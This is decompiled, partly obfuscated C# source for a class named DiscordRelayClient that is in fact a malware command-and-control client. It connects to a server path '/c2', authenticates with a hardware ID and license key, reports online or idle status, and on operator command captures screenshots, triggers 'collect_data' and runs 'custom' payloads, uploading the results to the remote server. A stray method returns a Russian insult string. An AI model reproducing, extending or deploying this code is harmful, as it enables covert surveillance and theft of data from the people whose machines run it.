using System;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;
using SocketIOClient;

namespace DiscordRelayClient;

public class DiscordRelayClient : IDisposable
{
	private SocketIO? socketIO_0;

	private readonly string serverUrl;

	private readonly string hwid;

	private readonly string licenseKey;

	private readonly string version;

	private bool bool_0;

	private bool bool_1;

	private Timer? timer_0;

	private Timer? timer_1;

	private DateTime dateTime_0;

	private string string_0 = "online";

	[CompilerGenerated]
	private EventHandler<string>? eventHandler_0;

	[CompilerGenerated]
	private EventHandler? eventHandler_1;

	[CompilerGenerated]
	private EventHandler<JObject>? eventHandler_2;

	[CompilerGenerated]
	private EventHandler? eventHandler_3;

	[CompilerGenerated]
	private EventHandler? eventHandler_4;

	private long long_0;

	private byte byte_1;

	public bool IsConnected
	{
		get
		{
			if (!bool_0)
			{
				return false;
			}
			return bool_1;
		}
	}

	private long Int64_0
	{
		get
		{
			return long_0;
		}
		set
		{
			long_0 = value;
		}
	}

	private byte Byte_0
	{
		get
		{
			return byte_1;
		}
		set
		{
			byte_1 = value;
		}
	}

	public event EventHandler<string>? Event_0
	{
		[CompilerGenerated]
		add
		{
			EventHandler<string> eventHandler = eventHandler_0;
			EventHandler<string> eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler<string> value2 = (EventHandler<string>)Delegate.Combine(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref eventHandler_0, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			EventHandler<string> eventHandler = eventHandler_0;
			EventHandler<string> eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler<string> value2 = (EventHandler<string>)Delegate.Remove(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref eventHandler_0, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
	}

	public event EventHandler? Event_1
	{
		[CompilerGenerated]
		add
		{
			EventHandler eventHandler = eventHandler_1;
			EventHandler eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler value2 = (EventHandler)Delegate.Combine(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref eventHandler_1, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			EventHandler eventHandler = eventHandler_1;
			EventHandler eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler value2 = (EventHandler)Delegate.Remove(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref eventHandler_1, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
	}

	public event EventHandler<JObject>? Event_2
	{
		[CompilerGenerated]
		add
		{
			EventHandler<JObject> eventHandler = eventHandler_2;
			EventHandler<JObject> eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler<JObject> value2 = (EventHandler<JObject>)Delegate.Combine(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref eventHandler_2, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			EventHandler<JObject> eventHandler = eventHandler_2;
			EventHandler<JObject> eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler<JObject> value2 = (EventHandler<JObject>)Delegate.Remove(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref eventHandler_2, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
	}

	public event EventHandler? Event_3
	{
		[CompilerGenerated]
		add
		{
			EventHandler eventHandler = eventHandler_3;
			EventHandler eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler value2 = (EventHandler)Delegate.Combine(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref eventHandler_3, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			EventHandler eventHandler = eventHandler_3;
			EventHandler eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler value2 = (EventHandler)Delegate.Remove(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref eventHandler_3, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
	}

	public event EventHandler? Event_4
	{
		[CompilerGenerated]
		add
		{
			EventHandler eventHandler = eventHandler_4;
			EventHandler eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler value2 = (EventHandler)Delegate.Combine(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref eventHandler_4, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			EventHandler eventHandler = eventHandler_4;
			EventHandler eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler value2 = (EventHandler)Delegate.Remove(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref eventHandler_4, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
	}

	public DiscordRelayClient(string serverUrl, string hwid, string licenseKey, string version)
	{
		this.serverUrl = serverUrl;
		this.hwid = hwid;
		this.licenseKey = licenseKey;
		this.version = version;
		dateTime_0 = DateTime.Now;
	}

	public async Task<bool> ConnectAsync()
	{
		try
		{
			socketIO_0 = new SocketIO(serverUrl, new SocketIOOptions
			{
				Path = "/c2",
				Reconnection = true,
				ReconnectionAttempts = int.MaxValue,
				ConnectionTimeout = TimeSpan.FromSeconds(10L)
			});
			SetupEventHandlers();
			await socketIO_0.ConnectAsync();
			DateTime timeout = DateTime.Now.AddSeconds(10.0);
			while (!bool_0 && DateTime.Now < timeout)
			{
				await Task.Delay(100);
			}
			if (!bool_0)
			{
				Logger.Error("[C2] ❌ Connection timeout - socket never connected");
				return false;
			}
			await AuthenticateAsync();
			timeout = DateTime.Now.AddSeconds(10.0);
			while (!bool_1 && DateTime.Now < timeout)
			{
				await Task.Delay(100);
			}
			if (!bool_1)
			{
				Logger.Error("[C2] ❌ Authentication timeout");
				return false;
			}
			timer_0 = new Timer(SendHeartbeat, null, TimeSpan.Zero, TimeSpan.FromSeconds(30L));
			dateTime_0 = DateTime.Now;
			timer_1 = new Timer(UpdateStatus, null, TimeSpan.FromSeconds(2L), TimeSpan.FromSeconds(15L));
			eventHandler_3?.Invoke(this, EventArgs.Empty);
			return true;
		}
		catch (Exception ex)
		{
			Logger.Error("[C2] ❌ Connection failed: " + ex.Message);
			_ = ex.InnerException;
			return false;
		}
	}

	private void SetupEventHandlers()
	{
		if (socketIO_0 == null)
		{
			return;
		}
		socketIO_0.OnConnected += delegate
		{
			bool_0 = true;
		};
		socketIO_0.OnDisconnected += delegate(object? sender, string e)
		{
			bool_0 = false;
			bool_1 = false;
			Logger.Warn("[C2] ⚠\ufe0f Socket disconnected. Reason: " + e);
			eventHandler_4?.Invoke(this, EventArgs.Empty);
		};
		socketIO_0.OnReconnectAttempt += delegate
		{
		};
		socketIO_0.OnError += delegate(object? sender, string e)
		{
			Logger.Error("[C2] ❌ Socket error: " + e);
		};
		socketIO_0.On("auth_success", (Action<SocketIOResponse>)delegate(SocketIOResponse response)
		{
			bool_1 = true;
			try
			{
				JObject.Parse(response.GetValue(0).ToString());
			}
			catch (Exception)
			{
				bool_1 = true;
			}
		});
		socketIO_0.On("auth_failed", (Action<SocketIOResponse>)delegate(SocketIOResponse response)
		{
			bool_1 = false;
			try
			{
				JObject val = JObject.Parse(response.GetValue(0).ToString());
				Logger.Error($"[C2] ❌ Authentication failed: {val["error"]}");
			}
			catch (Exception ex)
			{
				Logger.Error("[C2] ❌ Authentication failed (parse error: " + ex.Message + ")");
			}
		});
		socketIO_0.On("command", (Action<SocketIOResponse>)delegate(SocketIOResponse response)
		{
			try
			{
				JObject command = JObject.Parse(response.GetValue(0).ToString());
				HandleCommand(command);
			}
			catch (Exception)
			{
			}
		});
		socketIO_0.On("screenshot_ack", (Action<SocketIOResponse>)delegate(SocketIOResponse response)
		{
			try
			{
				JObject.Parse(response.GetValue(0).ToString());
			}
			catch (Exception)
			{
			}
		});
	}

	private async Task AuthenticateAsync()
	{
		if (socketIO_0 != null && bool_0)
		{
			try
			{
				await socketIO_0.EmitAsync("authenticate", new object[3] { hwid, licenseKey, version });
			}
			catch (Exception ex)
			{
				Logger.Error("[C2] ❌ Authentication error: " + ex.Message);
			}
		}
	}

	private void SendHeartbeat(object? state)
	{
		if (socketIO_0 != null && bool_1)
		{
			try
			{
				socketIO_0.EmitAsync("heartbeat", new object[1] { hwid }).Wait();
			}
			catch (Exception)
			{
			}
		}
	}

	private void UpdateStatus(object? state)
	{
		if (socketIO_0 != null && bool_1)
		{
			try
			{
				string text = ((!((DateTime.Now - dateTime_0).TotalMinutes <= 5.0)) ? "idle" : "online");
				string_0 = text;
				socketIO_0.EmitAsync("status_update", new object[2] { hwid, string_0 }).Wait();
			}
			catch (Exception)
			{
			}
		}
	}

	private void HandleCommand(JObject command)
	{
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		string commandId = ((object)command["id"])?.ToString();
		string text = ((object)command["type"])?.ToString();
		JToken obj = command["payload"];
		JObject val = (JObject)(object)((obj is JObject) ? obj : null);
		try
		{
			switch (text)
			{
			case "screenshot":
				HandleScreenshotCommand(commandId);
				break;
			default:
				SendCommandResponse(commandId, success: false, "Unknown command type: " + text);
				break;
			case "collect_data":
				HandleDataCollectionCommand(commandId);
				break;
			case "custom":
				eventHandler_2?.Invoke(this, (JObject)(((object)val) ?? ((object)new JObject())));
				SendCommandResponse(commandId, success: true);
				break;
			}
		}
		catch (Exception ex)
		{
			SendCommandResponse(commandId, success: false, ex.Message);
		}
	}

	private void HandleScreenshotCommand(string commandId)
	{
		try
		{
			eventHandler_0?.Invoke(this, commandId);
		}
		catch (Exception ex)
		{
			SendCommandResponse(commandId, success: false, ex.Message);
		}
	}

	private void HandleDataCollectionCommand(string commandId)
	{
		try
		{
			eventHandler_1?.Invoke(this, EventArgs.Empty);
			SendCommandResponse(commandId, success: true);
		}
		catch (Exception ex)
		{
			SendCommandResponse(commandId, success: false, ex.Message);
		}
	}

	public void SendCommandResponse(string commandId, bool success, string? error = null, object? data = null)
	{
		if (socketIO_0 == null || !bool_1)
		{
			return;
		}
		try
		{
			socketIO_0.EmitAsync("command_response", new object[4] { commandId, success, error, data }).Wait();
		}
		catch (Exception)
		{
		}
	}

	public async Task<bool> SendScreenshotAsync(string screenshotBase64, string commandId)
	{
		if (socketIO_0 != null && bool_1)
		{
			try
			{
				await socketIO_0.EmitAsync("screenshot_upload", new object[3]
				{
					hwid,
					screenshotBase64,
					DateTimeOffset.Now.ToUnixTimeMilliseconds()
				});
				SendCommandResponse(commandId, success: true, null, new
				{
					size = screenshotBase64.Length
				});
				return true;
			}
			catch (Exception ex)
			{
				SendCommandResponse(commandId, success: false, ex.Message);
				return false;
			}
		}
		return false;
	}

	public void UpdateActivity()
	{
		dateTime_0 = DateTime.Now;
	}

	public async Task DisconnectAsync()
	{
		try
		{
			timer_0?.Dispose();
			timer_1?.Dispose();
			if (socketIO_0 != null)
			{
				await socketIO_0.DisconnectAsync();
				socketIO_0.Dispose();
				socketIO_0 = null;
			}
			bool_0 = false;
			bool_1 = false;
		}
		catch (Exception)
		{
		}
	}

	public void Dispose()
	{
		DisconnectAsync().Wait();
	}

	private string? method_9(double double_0)
	{
		return "Хитролох_иди_нахуй.__13_____05_____6__8";
	}
}
